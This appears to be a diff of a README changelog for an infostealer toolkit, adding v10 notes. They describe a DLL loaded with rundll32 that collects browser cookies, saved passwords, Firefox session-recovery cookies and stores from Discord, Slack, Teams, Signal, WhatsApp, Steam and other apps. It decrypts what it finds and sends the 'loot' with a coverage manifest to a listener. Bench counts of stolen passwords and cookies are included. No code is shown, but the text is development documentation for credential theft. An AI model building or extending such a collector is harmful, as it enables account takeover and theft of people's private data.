@@ -3,7 +3,43 @@
 
 ## What's New
 
-### v9 -- build.py, cklog package, coverage manifests, VPS bootstrap (current)
+### v10 -- payload coverage manifests, CEF stores, Firefox sessionstore (current)
+
+**The payload now says what it looked at.** Records travel as
+`{"records":[...],"coverage":{...}}`; the manifest carries `host`, `run`, `ts`
+and one row per database file: kind, browser, profile, path, rows, decrypted,
+failed, and a fixed skip reason. `ckdll.dll` emits it from the same buffer as
+the records, so there is no second request and no ordering problem. The listener
+and `sink.py` unwrap both shapes, and old payloads still land as a bare list.
+
+**Sources counted instead of guessed.** Chromium cookies and `Login Data`,
+Firefox `cookies.sqlite`, Firefox session recovery, Discord LevelDB and the CEF
+stores now each contribute a row. Missing browser roots, a copy that could not
+read a locked database, a v20 Local State with no key loaded, and a decrypt that
+left every row empty all surface as `missing` / `locked` / `no-key` /
+`v10-fail` / `unsupported` rather than disappearing.
+
+**Wider collection.**
+- Password profiles are discovered by directory, not by the Default /
+  Profile 1..9 assumption, and a root-level `Login Data` is read too.
+- `sessionstore.jsonlz4` and `sessionstore-backups\recovery.jsonlz4` are
+  decompressed in-process (mozLz4 + LZ4 block) and parsed for session cookies;
+  the recovery copies are what the current session wrote after the last flush.
+- Curated CEF/Electron roots: Discord, Slack, Teams (classic and MSIX), Spotify,
+  Notion, Obsidian, VS Code, Signal, Element, WhatsApp, Steam.
+
+**Measured on the bench machine** (DEBUG-free DLL loaded with rundll32, real
+listener): 3,050 deduped records, 122 passwords, 329 session cookies; coverage
+33 sources / 3,574 rows / 3,573 decrypted / 1 failed / 17 skipped. The Firefox
+recovery files yielded 406 cookies and the Steam CEF store 140 rows / 139
+decrypted that the old collector never touched.
+
+**Note on row counts.** Coverage counts SQL rows; loot is deduped on
+host/browser/profile/domain/name/path. Partitioned cookies that share those
+fields collapse in the loot but stay counted in the manifest, which is the
+honest reading: 3,574 examined, 3,050 distinct.
+
+### v9 -- build.py, cklog package, coverage manifests, VPS bootstrap
 
 **One command for the toolchain.** `build.py` is now the single entrypoint:
 `check`, `all`, `payload`, `keytool`, `verify`, `hash`, `stage`, `test`,
